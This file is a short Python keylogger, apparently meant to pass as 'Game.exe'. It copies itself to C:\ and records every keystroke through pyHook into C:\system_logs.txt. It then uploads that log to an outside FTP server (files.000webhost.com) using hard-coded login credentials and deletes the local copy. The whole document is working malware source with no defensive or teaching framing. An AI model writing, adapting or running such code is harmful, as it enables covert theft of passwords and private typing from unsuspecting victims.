# -* - coding: utf-8 -* -
import pythoncom 
import ftplib, os
import pyHook
import shutil


def copy():
     try:
          files = ("C:\\")
          shutil.copy('Game.exe', files)
     except Exception as e:
           print('Tipo de erro 1:', type(e))
            
           
def ftp():
     try:
          files = ("system_logs.txt")
          user = "min3r"
          passw = "mr.robotd23"
          ftp = ftplib.FTP("files.000webhost.com")
          ftp.login(user, passw) 
          file = open(files, "rb") 
          ftp.cwd('/')
          ftp.storbinary('STOR ' + files, file) 
          print ("STORing File now...") 
          ftp.quit() 
          file.close() 
          os.remove(files)
     except Exception as e:
           print('Tipo de erro 2: ', type(e))
     
copy()
ftp()

def keyevent(event):
     try:
          files = ("C:\\system_logs.txt")
          fp = open(files, "a")
          fp.write(("\n"+event.Key))
          fp.close()
     except Exception as e:
          print('Tipo de erro 3: ', type(e))
          return True
     

obg= pyHook.HookManager()
obg.KeyDown = keyevent
obg.HookKeyboard()

pythoncom.PumpMessages()

